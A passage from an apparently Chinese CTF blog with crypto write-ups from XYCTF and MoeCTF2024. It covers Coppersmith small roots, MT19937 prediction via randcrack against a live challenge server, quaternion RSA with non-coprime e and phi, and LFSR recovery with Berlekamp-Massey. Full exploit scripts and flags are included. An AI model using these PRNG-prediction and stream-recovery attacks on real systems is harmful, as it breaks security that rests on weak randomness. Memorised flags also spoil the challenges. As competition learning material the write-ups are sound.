21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]R = PolynomialRing(Zmod(n), names=('x', 'y'))x, y = R.gens()f = (mh[0] + x)**3 - 3 * (mh[0] + x) * ((mh[1] + y)**2) - C[0]g = (mh[1] + y)**3 - 3 * (mh[0] + x)**2 * (mh[1] + y) + C[1]roots = small_roots(f, bounds=(2**129,2**129))enc = b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe'sum = mh[0]+mh[1]+roots[0][0]+roots[0][1]key = sha256(str(sum).encode()).digest()cipher = ChaCha20.new(key=key, nonce=b'Pr3d1ctmyxjj')flag = cipher.decrypt(enc)print(\"Recovered flag:\", flag.decode(errors='ignore'))  #XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}\n 3.division\n题目给了容器的server\n#server.py# -*- encoding: utf-8 -*-'''@File    :   server.py@Time    :   2025/03/20 12:25:03@Author  :   LamentXU '''import random print('----Welcome to my division calc----')print('''menu:      [1]  Division calc      [2]  Get flag''')while True:    choose = input(': &gt;&gt;&gt; ')    if choose == '1':        try:            denominator = int(input('input the denominator: &gt;&gt;&gt; '))        except:            print('INPUT NUMBERS')            continue        nominator = random.getrandbits(32)        if denominator == '0':            print('NO YOU DONT')            continue        else:            print(f'{nominator}//{denominator} = {nominator//denominator}')    elif choose == '2':        try:            ans = input('input the answer: &gt;&gt;&gt; ')            rand1 = random.getrandbits(11000)            rand2 = random.getrandbits(10000)            correct_ans = rand1 // rand2            if correct_ans == int(ans):                print('WOW')                with open('flag', 'r') as f:                    print(f'Here is your flag: {f.read()}')            else:                print(f'NOPE, the correct answer is {correct_ans}')        except:            print('INPUT NUMBERS')    else:        print('Invalid choice')\n考点主要是python的PRFrandom 其中使用的是MT19937算法，在输出比特超过624*32位时就能被预测，参考blogs([CTF/randcrack]python随机数预测模块分析及改进方案_random.getrandbits(32)-CSDN博客)\n博客师傅给了个很好用的轮子，思路也很清楚，选择1，输入1，就能获得这次生成的随机数，那么输624次，再选择2，输入预测的值就Ok了，直接上exp\nimport socketimport reimport timeimport random from randcrack import RandCrack #下载randcrack库后导入类# 配置服务器地址和端口host = 'gz.imxbt.cn'  # 替换成目标服务器的 IP 地址port = 20522         # 替换成目标服务器的端口号rc = RandCrack()res = ''def exploit(host, port):    # Connect to the target    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))            for i in range (625):        s.send(b'1\\n')        time.sleep(0.05)        s.send(b'1\\n')        time.sleep(0.05)        response = s.recv(40000).decode('utf-8')    print(response)    numbers = re.findall(r'(\\d{2,})', response)    # 使用列表推导式保持顺序并去重    filtered_numbers = []    seen = set()    for num in numbers:        if num != '1' and num not in seen:            filtered_numbers.append(num)            seen.add(num)    print(len(filtered_numbers))    print(filtered_numbers)    for nums in filtered_numbers:        rc.submit(int(nums))#每次循环提交一个32位random生成的随机数    s.send(b'2\\n')    time.sleep(0.5)    d=rc.predict_getrandbits(32)    a=rc.predict_getrandbits(11000)    b=rc.predict_getrandbits(10000)    c=a//b    print(c)    s.send(f\"{c}\\n\".encode())    time.sleep(0.5)      response = s.recv(2048).decode('utf-8')    print(f\"{response}\")   if __name__ == \"__main__\":    exploit(host, port)# flag{I_do_not_want_any_CTFER_get_0_solve_in_Crypto_bad_bad_adwa}\n 4.choice\n这道也是考察的MT19937的内容，题干\nfrom Crypto.Util.number import bytes_to_longfrom random import Randomfrom secret import flagassert flag.startswith(b'XYCTF{') and flag.endswith(b'}')flag = flag[6:-1]msg = bytes_to_long(flag)rand = Random()test = bytes([i for i in range(255, -1, -1)]) #256个字符 asciiprint(test)open('output.py', 'w').write(f'enc = {msg ^ rand.getrandbits(msg.bit_length())}\\nr = {[rand.choice(test) for _ in range(2496)]}')    # 先getrandbits的用了一次# 再存在choice test 即选择的部分\n不过这里是生成了2496个8bit的数字，可知2496*8 = 624 *32 bit数是够用的，沿用上面博客师傅的轮子，就可以破解伪随机生成器，但是这里flag的长度未知，爆破就行了，exp如下\nfrom pyrandcracker import RandCrackerfrom Crypto.Util.number import *rc = RandCracker(detail = True)r = [224, 55, 218, 253, 150, 84, 208, 134, 18, 177, 244, 54, 122, 193, 249, 5, 121, 80, 230, 21, 236, 33, 226, 3, 120, 141, 212, 33, 69, 195, 78, 112, 0, 62, 64, 197, 10, 224, 64, 191, 17, 112, 196, 143, 209, 92, 10, 198, 174, 181, 96, 118, 175, 145, 111, 41, 113, 206, 137, 37, 56, 227, 252, 84, 18, 145, 81, 124, 202, 14, 255, 144, 200, 13, 230, 218, 208, 210, 222, 101, 211, 114, 222, 12, 190, 226, 62, 118, 87, 152, 118, 245, 196, 4, 92, 251, 238, 142, 114, 13, 113, 247, 171, 8, 138, 20, 169, 192, 221, 223, 60, 56, 188, 70, 184, 202, 195, 246, 71, 235, 152, 255, 73, 128, 140, 159, 119, 79, 1, 223, 239, 242, 60, 228, 205, 90, 210, 5, 165, 35, 176, 75, 21, 182, 220, 212, 240, 212, 77, 124, 52, 140, 85, 200, 207, 31, 177, 82, 76, 152, 128, 124, 205, 216, 252, 34, 27, 198, 186, 61, 161, 192, 158, 226, 40, 127, 69, 162, 24, 46, 208, 183, 99, 165, 1, 221, 184, 40, 147, 136, 236, 245, 228, 197, 86, 15, 201, 95, 115, 18, 131, 79, 86, 12, 122, 63, 200, 192, 244, 205, 229, 36, 86, 217, 249, 170, 5, 134, 99, 33, 214, 10, 120, 105, 233, 115, 230, 114, 105, 84, 39, 167, 18, 10, 77, 236, 104, 225, 196, 181, 105, 180, 159, 24, 4, 147, 131, 143, 64, 201, 212, 175, 203, 200, 19, 99, 24, 112, 180, 75, 222, 204, 204, 13, 210, 165, 135, 175, 132, 205, 247, 28, 178, 76, 240, 196, 240, 121, 132, 21, 8, 45, 203, 143, 206, 6, 11, 51, 47, 87, 88, 35, 63, 168, 251, 11, 254, 11, 46, 72, 210, 230, 184, 114, 88, 194, 99, 229, 144, 1, 226, 44, 133, 10, 42, 234, 112, 100, 248, 247, 66, 221, 72, 229, 236, 4, 65, 203, 65, 61, 23, 181, 190, 87, 1, 76, 113, 48, 178, 42, 175, 49, 78, 159, 104, 229, 213, 223, 13, 249, 216, 60, 144, 203, 156, 23, 129, 148, 87, 37, 79, 227, 141, 202, 210, 245, 236, 121, 129, 78, 7, 121, 42, 82, 184, 222, 96, 100, 189, 62, 102, 176, 198, 1, 153, 242, 23, 191, 197, 176, 115, 206, 122, 50, 104, 70, 170, 29, 52, 189, 157, 99, 82, 187, 201, 78, 25, 75, 126, 118, 160, 250, 53, 112, 143, 161, 251, 221, 44, 255, 232, 115, 182, 77, 31, 217, 228, 97, 112, 236, 21, 160, 127, 9, 220, 22, 97, 159, 239, 25, 140, 206, 210, 148, 105, 184, 41, 56, 92, 141, 3, 200, 165, 14, 161, 219, 177, 40, 189, 75, 48, 146, 130, 151, 100, 144, 239, 22, 19, 246, 166, 231, 228, 68, 254, 16, 99, 95, 32, 177, 216, 170, 125, 211, 100, 142, 251, 16, 64, 83, 161, 184, 242, 248, 239, 141, 171, 135, 48, 20, 34, 250, 13, 70, 236, 172, 22, 241, 171, 25, 18, 204, 36, 248, 253, 203, 138, 10, 130, 249, 15, 157, 244, 154, 41, 4, 231, 64, 20, 212, 126, 160, 48, 154, 171, 250, 199, 113, 32, 186, 126, 217, 3, 236, 115, 37, 174, 75, 222, 125, 55, 86, 65, 96, 56, 254, 226, 213, 244, 36, 199, 164, 160, 126, 191, 29, 50, 135, 234, 165, 122, 132, 68, 133, 129, 0, 220, 72, 87, 172, 93, 15, 131, 37, 119, 240, 43, 239, 105, 45, 244, 6, 34, 111, 151, 144, 54, 46, 159, 6, 5, 160, 32, 4, 180, 246, 39, 220, 85, 209, 145, 41, 88, 137, 110, 101, 113, 115, 204, 11, 53, 152, 177, 240, 193, 220, 136, 84, 221, 12, 43, 74, 122, 251, 236, 53, 175, 36, 46, 246, 181, 137, 246, 53, 189, 171, 240, 104, 8, 126, 56, 122, 245, 155, 130, 31, 16, 20, 212, 147, 33, 165, 82, 117, 244, 167, 235, 115, 244, 94, 173, 195, 34, 36, 33, 218, 39, 13, 90, 196, 172, 207, 105, 73, 255, 187, 221, 162, 242, 186, 122, 140, 241, 120, 98, 44, 81, 172, 201, 150, 238, 111, 147, 24, 214, 192, 125, 102, 157, 53, 219, 172, 123, 218, 222, 71, 138, 117, 188, 32, 104, 10, 188, 118, 58, 254, 36, 104, 212, 76, 209, 15, 6, 33, 149, 15, 225, 76, 8, 157, 48, 70, 127, 19, 126, 77, 216, 133, 132, 30, 33, 113, 117, 134, 238, 57, 20, 121, 26, 184, 229, 202, 90, 28, 42, 230, 42, 159, 19, 191, 162, 205, 241, 67, 177, 216, 191, 164, 146, 90, 228, 232, 149, 163, 135, 130, 193, 196, 178, 215, 216, 155, 238, 20, 36, 196, 153, 207, 177, 149, 40, 172, 139, 12, 134, 142, 154, 225, 179, 95, 248, 190, 8, 154, 246, 229, 102, 121, 197, 116, 135, 163, 128, 109, 112, 114, 143, 164, 134, 233, 45, 244, 22, 141, 211, 214, 122, 14, 93, 49, 251, 85, 95, 95, 191, 210, 245, 181, 142, 125, 110, 33, 195, 150, 197, 173, 86, 50, 127, 187, 129, 67, 119, 58, 134, 119, 36, 151, 136, 122, 157, 22, 171, 195, 48, 178, 232, 228, 177, 6, 124, 50, 163, 161, 32, 49, 197, 157, 188, 86, 208, 226, 208, 63, 173, 21, 192, 148, 194, 208, 251, 95, 117, 34, 116, 217, 130, 150, 97, 206, 101, 201, 88, 137, 163, 90, 104, 129, 4, 191, 99, 50, 115, 8, 145, 116, 250, 180, 193, 229, 128, 92, 55, 26, 6, 154, 68, 0, 66, 77, 126, 192, 170, 218, 252, 127, 192, 29, 107, 152, 231, 190, 202, 130, 116, 229, 193, 63, 13, 48, 220, 238, 126, 74, 232, 19, 242, 71, 159, 9, 196, 187, 111, 243, 81, 244, 193, 95, 166, 85, 22, 240, 32, 1, 114, 11, 64, 114, 149, 217, 207, 194, 1, 33, 245, 14, 101, 119, 32, 233, 214, 139, 71, 103, 125, 54, 17, 86, 140, 132, 221, 45, 227, 136, 203, 156, 223, 73, 43, 82, 190, 119, 22, 14, 115, 0, 192, 105, 147, 210, 146, 47, 89, 210, 18, 225, 126, 210, 240, 55, 219, 247, 106, 190, 50, 35, 13, 255, 236, 253, 82, 244, 117, 139, 1, 72, 182, 19, 170, 173, 59, 175, 10, 95, 66, 253, 178, 139, 45, 5, 24, 59, 9, 222, 58, 46, 79, 48, 39, 175, 196, 249, 249, 70, 126, 118, 69, 165, 155, 119, 67, 221, 20, 133, 16, 99, 41, 132, 11, 12, 35, 70, 87, 43, 197, 103, 33, 201, 3, 195, 142, 128, 135, 121, 26, 185, 2, 73, 235, 70, 219, 49, 227, 133, 241, 34, 6, 9, 109, 66, 50, 177, 114, 119, 101, 91, 144, 41, 246, 40, 81, 113, 203, 226, 87, 8, 0, 73, 212, 5, 95, 112, 230, 4, 28, 206, 93, 252, 30, 195, 197, 226, 165, 120, 3, 124, 169, 66, 227, 113, 55, 101, 135, 141, 71, 84, 202, 19, 145, 25, 92, 50, 80, 53, 63, 85, 184, 196, 93, 254, 47, 252, 182, 150, 115, 20, 181, 178, 87, 162, 50, 190, 228, 125, 240, 134, 10, 142, 173, 206, 250, 49, 186, 201, 118, 146, 246, 244, 199, 9, 55, 253, 123, 103, 200, 206, 79, 168, 216, 99, 192, 191, 236, 214, 248, 111, 115, 74, 155, 165, 150, 40, 86, 224, 240, 133, 69, 34, 52, 13, 63, 61, 116, 182, 144, 177, 101, 164, 77, 217, 65, 218, 150, 142, 249, 165, 160, 220, 120, 25, 36, 157, 134, 223, 11, 46, 121, 75, 182, 126, 104, 91, 204, 45, 49, 175, 10, 48, 83, 150, 96, 244, 10, 149, 76, 124, 189, 149, 200, 252, 175, 124, 146, 126, 230, 70, 194, 243, 63, 204, 224, 115, 140, 115, 110, 86, 22, 193, 5, 11, 18, 177, 159, 94, 160, 38, 188, 139, 89, 1, 200, 163, 138, 8, 140, 169, 54, 29, 225, 22, 5, 99, 144, 247, 239, 106, 77, 29, 141, 206, 89, 236, 4, 32, 104, 115, 206, 204, 15, 100, 66, 199, 15, 89, 24, 246, 99, 224, 207, 7, 205, 142, 203, 28, 87, 16, 110, 93, 72, 73, 206, 48, 59, 170, 152, 224, 2, 74, 9, 125, 140, 82, 206, 159, 0, 117, 237, 252, 47, 200, 75, 133, 68, 239, 109, 169, 25, 168, 202, 240, 5, 67, 125, 173, 233, 6, 148, 38, 182, 13, 141, 149, 39, 119, 189, 122, 49, 173, 153, 78, 103, 211, 65, 224, 52, 10, 35, 233, 88, 66, 43, 120, 255, 71, 169, 215, 250, 218, 205, 163, 164, 226, 46, 178, 25, 88, 59, 98, 199, 167, 134, 244, 167, 210, 20, 246, 159, 163, 252, 114, 5, 168, 52, 47, 177, 159, 255, 236, 166, 49, 36, 61, 10, 130, 135, 220, 101, 202, 69, 150, 100, 217, 98, 203, 217, 166, 33, 169, 203, 230, 194, 224, 15, 249, 205, 52, 41, 124, 191, 223, 148, 251, 147, 133, 85, 149, 214, 198, 5, 134, 91, 201, 191, 204, 152, 240, 37, 34, 236, 211, 182, 142, 207, 1, 188, 67, 87, 222, 220, 7, 78, 49, 129, 236, 98, 120, 217, 204, 77, 106, 89, 250, 182, 15, 18, 27, 143, 13, 27, 61, 223, 213, 196, 190, 24, 35, 104, 100, 220, 60, 194, 174, 169, 20, 167, 75, 162, 26, 253, 213, 59, 219, 187, 253, 160, 249, 61, 122, 113, 223, 55, 57, 198, 53, 138, 94, 154, 18, 132, 233, 183, 71, 7, 22, 50, 196, 181, 202, 103, 86, 31, 119, 83, 130, 165, 242, 170, 31, 35, 175, 117, 95, 89, 247, 221, 186, 47, 236, 241, 77, 194, 111, 148, 45, 101, 88, 41, 0, 33, 139, 15, 127, 156, 72, 234, 217, 170, 218, 216, 31, 4, 73, 150, 78, 49, 178, 13, 178, 46, 102, 93, 184, 110, 205, 132, 190, 43, 87, 194, 35, 188, 166, 9, 97, 184, 202, 113, 45, 150, 62, 106, 108, 19, 162, 85, 212, 188, 131, 38, 67, 23, 136, 208, 87, 63, 69, 6, 209, 242, 45, 13, 228, 14, 233, 8, 71, 43, 51, 89, 46, 195, 101, 132, 254, 154, 183, 220, 115, 221, 255, 174, 150, 65, 141, 176, 57, 144, 16, 115, 252, 144, 139, 52, 205, 224, 75, 190, 192, 2, 231, 30, 238, 149, 22, 200, 137, 244, 239, 185, 212, 145, 230, 200, 8, 249, 109, 26, 226, 195, 133, 140, 103, 50, 230, 180, 47, 196, 226, 105, 13, 239, 135, 20, 214, 152, 211, 208, 81, 213, 48, 187, 232, 77, 139, 16, 79, 204, 216, 56, 41, 41, 58, 192, 245, 1, 104, 85, 42, 107, 94, 142, 12, 247, 90, 254, 116, 72, 193, 219, 54, 247, 5, 28, 60, 140, 10, 185, 86, 148, 101, 198, 96, 181, 245, 61, 25, 186, 29, 57, 176, 188, 9, 239, 93, 198, 110, 248, 23, 87, 193, 161, 107, 40, 38, 186, 205, 148, 197, 127, 144, 69, 19, 47, 132, 82, 23, 170, 83, 224, 235, 49, 190, 44, 145, 65, 66, 141, 78, 1, 254, 24, 157, 7, 23, 227, 28, 81, 176, 22, 92, 139, 188, 48, 183, 229, 139, 205, 174, 131, 189, 241, 21, 146, 204, 58, 249, 167, 217, 174, 43, 41, 56, 181, 212, 42, 188, 6, 117, 93, 178, 160, 129, 15, 76, 150, 207, 245, 227, 247, 130, 171, 114, 204, 101, 176, 55, 43, 138, 149, 90, 124, 45, 96, 181, 221, 16, 121, 210, 51, 210, 164, 68, 64, 154, 167, 91, 69, 35, 153, 212, 10, 125, 235, 203, 166, 145, 9, 174, 86, 65, 70, 112, 194, 140, 92, 170, 49, 191, 157, 218, 199, 152, 151, 247, 208, 182, 209, 34, 245, 5, 173, 105, 175, 159, 71, 251, 198, 246, 214, 99, 58, 70, 154, 52, 39, 88, 149, 179, 202, 86, 240, 108, 200, 83, 250, 62, 213, 113, 138, 73, 106, 141, 192, 204, 90, 251, 208, 28, 124, 30, 134, 119, 144, 68, 23, 204, 181, 186, 76, 156, 71, 8, 104, 186, 87, 221, 134, 122, 72, 244, 203, 121, 181, 65, 90, 185, 131, 230, 133, 54, 158, 186, 168, 201, 178, 155, 172, 164, 22, 130, 111, 90, 209, 2, 167, 23, 176, 63, 139, 89, 63, 15, 238, 110, 204, 85, 36, 127, 68, 240, 177, 31, 2, 81, 147, 205, 192, 214, 173, 103, 130, 10, 100, 232, 125, 216, 163, 209, 171, 168, 243, 145, 6, 170, 41, 142, 250, 145, 57, 139, 224, 221, 189, 48, 141, 232, 146, 92, 216, 154, 126, 223, 8, 90, 82, 138, 221, 240, 223, 87, 209, 165, 17, 52, 154, 91, 12, 121, 212, 238, 46, 215, 217, 147, 136, 139, 251, 91, 39, 188, 244, 251, 52, 110, 22, 126, 200, 231, 153, 103, 203, 120, 219, 118, 172, 53, 141, 203, 75, 163, 150, 194, 27, 208, 9, 186, 6, 85, 46, 243, 135, 66, 40, 79, 206, 250, 20, 85, 123, 35, 164, 44, 85, 104, 66, 51, 177, 125, 189, 165, 226, 13, 75, 78, 225, 252, 226, 138, 81, 171, 172, 175, 122, 145, 68, 254, 37, 153, 39, 113, 237, 232, 220, 80, 193, 181, 21, 197, 186, 56, 202, 239, 213, 135, 41, 6, 85, 54, 135, 214, 95, 102, 23, 192, 153, 235, 110, 26, 14, 84, 220, 142, 236, 192, 8, 117, 205, 249, 92, 148, 149, 77, 235, 205, 232, 21, 48, 14, 84, 187, 124, 218, 166, 155, 183, 62, 10, 123, 53, 63, 79, 101, 193, 3, 61, 29, 39, 99, 22, 197, 75, 10, 165, 44, 215, 210, 181, 74, 235, 200, 247, 158, 187, 200, 102, 22, 150, 73, 42, 131, 28, 17, 180, 133, 205, 23, 228, 226, 219, 175, 207, 81, 53, 141, 114, 140, 59, 218, 169, 7, 219, 139, 75, 210, 97, 236, 157, 21, 109, 195, 128, 54, 5, 55, 217, 127, 49, 62, 59, 101, 95, 86, 255, 22, 186, 94, 151, 114, 93, 19, 198, 159, 174, 142, 132, 195, 157, 206, 161, 107, 255, 106, 196, 250, 191, 86, 221, 196, 36, 29, 37, 50, 224, 42, 20, 89, 212, 252, 191, 157, 237, 10, 157, 80, 42, 234, 180, 1, 183, 186, 239, 129, 14, 125, 114, 66, 203, 120, 114, 37, 214, 37, 73, 153, 182, 165, 87, 177, 75, 220, 210, 105, 154, 149, 114, 13, 202, 128, 55, 128, 96, 158, 150, 57, 86, 106, 127, 160, 57, 80, 255, 107, 241, 95, 121, 14, 110, 160, 119, 211, 150, 156, 185, 158, 221, 110, 76, 255, 119, 15, 245, 1, 238, 139, 100, 250, 220, 147, 193, 51, 144, 123, 139, 13, 26, 158, 95, 148, 251, 82, 227, 119, 92, 132, 219, 248, 239, 217, 101, 88, 121, 10, 148, 203, 156, 156]enc = 5042764371819053176884777909105310461303359296255297for i in r:    rc.submit(255-i,8)rc.check(offset = True)# 爆破长度为i即可for i in range(150,200):    rc.offset_bits(-i)    data = rc.rnd.getrandbits(i)    print(long_to_bytes(data^enc))#稍微要跑一会#b'___0h_51mple_r@nd0m___'\n 5.*复复复复数\nclass ComComplex:    def __init__(self, value=[0,0,0,0]):        self.value = value    def __str__(self):        s = str(self.value[0])        for k,i in enumerate(self.value[1:]):            if i &gt;= 0:                s += '+'            s += str(i) +'ijk'[k]        return s    def __add__(self,x):        return ComComplex([i+j for i,j in zip(self.value,x.value)])    def __mul__(self,x):        a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3]        b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2]        c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1]        d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0]        return ComComplex([a,b,c,d])    def __mod__(self,x):        return ComComplex([i % x for i in self.value])    def __pow__(self, x, n=None):        tmp = ComComplex(self.value)        a = ComComplex([1,0,0,0])        while x:            if x &amp; 1:                a *= tmp            tmp *= tmp            if n:                a %= n                tmp %= n            x &gt;&gt;= 1        return afrom Crypto.Util.number import *from secret import flag, hintp = getPrime(256)q = getPrime(256)r = getPrime(256)n = p * q * rP = getPrime(512)assert len(hint) == 20hints = ComComplex([bytes_to_long(hint[i:i+5]) for i in range(0,20,5)])keys = ComComplex([0, p, q, r])print('hint =',hints)print('gift =',hints*keys%P)print('P =',P)e = 65547m = ComComplex([bytes_to_long(flag[i:i+len(flag)//4+1]) for i in range(0,len(flag),len(flag)//4+1)])c = pow(m, e, n)print('n =', n)print('c =', c)'''hint = 375413371936+452903063925i+418564633198j+452841062207kgift = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729+20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171i+22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868j+40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863kP = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k'''\n首先，定义了一个四元数的运算，首先这里的p,q,r都是可以求的，解线性方程和四元数求模逆都是可行的方法，\nq−1=q∗∣q∣2q^{-1}=\\frac{q^*}{|q|^2}\nq−1=∣q∣2q∗​\npart1 求pqr\n  F=GF(P)hint = [F(x) for x in [375413371936, 452903063925, 418564633198, 452841062207]]H = matrix(F,[    [hint[0],-hint[1],-hint[2],-hint[3]],    [hint[1],hint[0],-hint[3],hint[2]],    [hint[2],hint[3],hint[0],-hint[1]],    [hint[3],-hint[2],hint[1],hint[0]]])g = vector(GF(P),[gift[0],gift[1],gift[2],gift[3]])v = H.solve_right(g)p=int(v[1])q=int(v[2])r=int(v[3])#解方程\n\npart2 分析RSA\n\n这里e=65547=9*7283 且算一下就能发现e phi不互素，gcd(e,ϕ)=9gcd(e,\\phi)=9gcd(e,ϕ)=9,然后这里模指不互素的原理还没有搞太明白，先贴一下exp，晚一些再补充一下\nclass ComComplex:    def __init__(self, value=[0,0,0,0]):        self.value = value    def __str__(self):        s = str(self.value[0])        for k,i in enumerate(self.value[1:]):            if i &gt;= 0:                s += '+'            s += str(i) +'ijk'[k]        return s    def __add__(self,x):        return ComComplex([i+j for i,j in zip(self.value,x.value)])    def __mul__(self,x):        a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3]        b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2]        c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1]        d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0]        return ComComplex([a,b,c,d])    def __mod__(self,x):        return ComComplex([i % x for i in self.value])    def __pow__(self, x, n=None):        tmp = ComComplex(self.value)        a = ComComplex([1,0,0,0])        while x:            if x &amp; 1:                a *= tmp            tmp *= tmp            if n:                a %= n                tmp %= n            x &gt;&gt;= 1        return a    def inv(self, mod):        inv_len = inverse(sum(i**2 for i in self.value), mod)        return ComComplex([self.value[0] * inv_len % mod, -self.value[1] * inv_len % mod, -self.value[2] * inv_len % mod, -self.value[3] * inv_len % mod])# 计算模逆元from Crypto.Util.number import *from sage.all import *hint = [375413371936,452903063925,418564633198,452841062207]gift = [8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729,20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171,22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868,40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863]P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367c = [212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103,24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825,45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125,96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385]e=65547# 65547 = 7283*9c = ComComplex([c[0],c[1],c[2],c[3]])F=GF(P)hint = [F(x) for x in [375413371936, 452903063925, 418564633198, 452841062207]]H = matrix(F,[    [hint[0],-hint[1],-hint[2],-hint[3]],    [hint[1],hint[0],-hint[3],hint[2]],    [hint[2],hint[3],hint[0],-hint[1]],    [hint[3],-hint[2],hint[1],hint[0]]])g = vector(GF(P),[gift[0],gift[1],gift[2],gift[3]])v = H.solve_right(g)p=int(v[1])q=int(v[2])r=int(v[3])phi =q*(q-1)*(q**2-1)# print(GCD(e,(p-1)*(q-1)*(r-1)))# print(GCD(e,p-1))print(GCD(e,q-1)) # 去计算q的欧拉函数？print(gcd(e,phi))d=inverse(e,phi//3)m = pow(c,d,q)# 实际上还是在这个四元数下计算得到的结果print(m)# print(GCD(e,r-1))for i in m.value:    print(long_to_bytes(int(i)).decode(),end='')# flag{Quaternion_15_ComComComComplexXXX!!!?}\n","categories":["复现"],"tags":["CTF","RSA","MT19937"]},{"title":"MoeCTF2024-复现","url":"/2025/05/12/moectf2024-%E5%A4%8D%E7%8E%B0/","content":"\n复现了一下后面的几道题目，前面的题写的时间有点久远了，主要是我懒\n\n Ezmatirx\n题干\nfrom Crypto.Util.number import *from secret import FLAG,secrets,SECERT_T    assert len(secrets) == 16assert FLAG == b'moectf{' + secrets + b'}'assert len(SECERT_T) &lt;= 127    class LFSR:    def __init__(self):        self._s = list(map(int,list(\"{:0128b}\".format(bytes_to_long(secrets)))))        for _ in range(8*len(secrets)):            self.clock()    def clock(self):        b = self._s[0]        c = 0        for t in SECERT_T:c ^= self._s[t]        self._s = self._s[1:] + [c]        return b    def stream(self, length):        return [self.clock() for _ in range(length)]    c = LFSR()stream = c.stream(256)print(\"\".join(map(str,stream))[:-5])# 11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110\nLFSR问题 考虑使用BM算法  来恢复抽头Secret_T，板子如下\ndef berlekamp_massey(s):    n = len(s)    c, b = [0] * n, [0] * n    c[0], b[0] = 1, 1    l, m, d = 0, -1, 0    for i in range(n):        d = s[i]        for j in range(1, l + 1):            d ^= c[j] &amp; s[i - j]        if d == 1:            t = c.copy()            p = [0] * n            for j in range(n - i + m):                if j &lt; len(b):                    p[j + i - m] = b[j]            c = [c[k] ^ p[k] for k in range(n)]            if 2 * l &lt;= i:                l, m, b = i + 1 - l, i, t    return [i for i, bit in enumerate(c[:l + 1]) if bit]\n然后lfsr逆不出来，美美不会了 ，仔细一想BM算法好像要求你有的输出序列是状态n的至少两倍，这里只有251个，估计不够的，反正输出也就是01串，直接爆破这五位不就行啦 然后检测一下 下标有小于0或者大于128的丢掉就行 然后对获得的taps拿来逆lfsr\nexp\ndef xor(state,taps):    res = 0    for i in taps:        res^=state[i]    return res  s_original = '11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110'  for i in range(128):    s = s_original    s = s + bin(i)[2:].zfill(5)    # print(s)    # print(len(s))    ss = list(map(int, s))    taps = berlekamp_massey(ss)    taps = [int(i)-1 for i in taps][1:]    mark = 0    for i in taps:        if i&lt;0 or i &gt; 127:            mark = 1    if mark :        continue    # print(taps)    lst = ss[:128][::-1]    for i in range(128):        tmp = lst[0]        for i in range(1,128):            